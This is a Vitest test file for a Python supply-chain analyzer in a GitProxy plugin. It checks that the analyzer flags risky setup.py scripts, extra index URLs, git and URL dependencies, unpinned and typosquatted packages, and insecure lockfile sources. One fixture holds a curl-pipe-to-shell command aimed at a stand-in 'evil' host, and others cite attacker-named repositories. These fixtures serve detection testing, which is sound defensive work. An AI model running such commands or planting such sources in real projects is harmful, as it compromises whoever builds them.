/**
 * Copyright 2026 GitProxy Contributors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import { describe, it, expect } from 'vitest';
import { analyzePython } from '../../../plugins/git-proxy-plugin-supply-chain/lib/ecosystems/python.js';
import { resolveConfig } from '../../../plugins/git-proxy-plugin-supply-chain/lib/config.js';

const config = resolveConfig();

const scan = (
  path: string,
  kind: string,
  newContent: string | null,
  oldContent: string | null = null,
) => analyzePython({ path, kind, oldContent, newContent, config });

const byRule = (findings: { rule: string }[], rule: string) =>
  findings.filter((f) => f.rule === rule);

describe('python analyzer - setup.py', () => {
  it('flags an added setup.py as HIGH (arbitrary code at build time)', () => {
    const findings = scan(
      'setup.py',
      'manifest',
      'from setuptools import setup\nsetup(name="x")\n',
    );
    const s = byRule(findings, 'python-setup-script');
    expect(s).toHaveLength(1);
    expect(s[0].severity).toBe('high');
    expect(s[0].title).toContain('added');
  });

  it('escalates a setup.py with os.system/network to CRITICAL', () => {
    const findings = scan(
      'setup.py',
      'manifest',
      'import os\nos.system("curl http://evil/x | sh")\n',
    );
    expect(byRule(findings, 'python-setup-script')[0].severity).toBe('critical');
  });

  it('marks a modified setup.py', () => {
    const findings = scan(
      'setup.py',
      'manifest',
      'from setuptools import setup\nsetup(name="x", version="2")\n',
      'from setuptools import setup\nsetup(name="x", version="1")\n',
    );
    expect(byRule(findings, 'python-setup-script')[0].title).toContain('modified');
  });
});

describe('python analyzer - requirements.txt', () => {
  it('flags --extra-index-url as HIGH (dependency confusion)', () => {
    const findings = scan(
      'requirements.txt',
      'manifest',
      '--extra-index-url https://internal.example/simple\nflask==2.0.0\n',
    );
    const idx = byRule(findings, 'python-index-url');
    expect(idx).toHaveLength(1);
    expect(idx[0].severity).toBe('high');
  });

  it('flags --index-url as MEDIUM', () => {
    const findings = scan(
      'requirements.txt',
      'manifest',
      '--index-url https://internal.example/simple\n',
    );
    expect(byRule(findings, 'python-index-url')[0].severity).toBe('medium');
  });

  it('flags vcs/url/editable installs as non-registry sources', () => {
    const findings = scan(
      'requirements.txt',
      'manifest',
      'git+https://github.com/a/b.git#egg=b\n-e https://example.com/pkg.tar.gz\nfoo @ https://example.com/foo.whl\n',
    );
    expect(byRule(findings, 'python-non-registry-source')).toHaveLength(3);
  });

  it('flags an unpinned requirement as LOW but not a pinned one', () => {
    const findings = scan('requirements.txt', 'manifest', 'flask\nrequests==2.31.0\n');
    const loose = byRule(findings, 'python-unpinned');
    expect(loose).toHaveLength(1);
    expect(loose[0].title).toContain('flask');
  });

  it('flags a typosquatted requirement', () => {
    const findings = scan('requirements.txt', 'manifest', 'requsts==2.31.0\n');
    const typo = byRule(findings, 'typosquat');
    expect(typo).toHaveLength(1);
    expect(typo[0].title).toContain('requests');
  });

  it('ignores comments and only scans newly added lines', () => {
    const findings = scan(
      'requirements.txt',
      'manifest',
      '# a comment\nflask==2.0.0\ngit+https://evil/x.git\n',
      'flask==2.0.0\n',
    );
    // flask is unchanged; only the git line is new
    expect(byRule(findings, 'python-non-registry-source')).toHaveLength(1);
    expect(byRule(findings, 'python-unpinned')).toHaveLength(0);
  });
});

describe('python analyzer - pyproject.toml / Pipfile', () => {
  it('flags a custom package index source', () => {
    const findings = scan(
      'pyproject.toml',
      'manifest',
      '[[tool.poetry.source]]\nname = "internal"\nurl = "https://internal.example/simple"\n',
    );
    expect(byRule(findings, 'python-custom-index')).toHaveLength(1);
  });

  it('flags an inline git dependency source', () => {
    const findings = scan(
      'pyproject.toml',
      'manifest',
      'mylib = { git = "https://github.com/attacker/mylib.git" }\n',
    );
    expect(byRule(findings, 'python-non-registry-source')).toHaveLength(1);
  });

  it('flags a PEP 508 direct url reference', () => {
    const findings = scan(
      'pyproject.toml',
      'manifest',
      'dependencies = ["mylib @ https://example.com/mylib.whl"]\n',
    );
    expect(byRule(findings, 'python-non-registry-source')).toHaveLength(1);
  });
});

describe('python analyzer - lockfiles', () => {
  it('flags a git source in poetry.lock', () => {
    const findings = scan(
      'poetry.lock',
      'lockfile',
      '[package.source]\ntype = "git"\nurl = "git+https://github.com/attacker/x.git"\n',
    );
    expect(byRule(findings, 'python-lockfile-git-source')).toHaveLength(1);
  });

  it('flags a plain-http source in a lockfile', () => {
    const findings = scan('poetry.lock', 'lockfile', 'url = "http://insecure.example/x.whl"\n');
    expect(byRule(findings, 'python-lockfile-insecure-source')).toHaveLength(1);
  });

  it('does not flag the official index host', () => {
    const findings = scan(
      'poetry.lock',
      'lockfile',
      'url = "https://files.pythonhosted.org/packages/xx/pkg.whl"\n',
    );
    expect(findings).toHaveLength(0);
  });
});
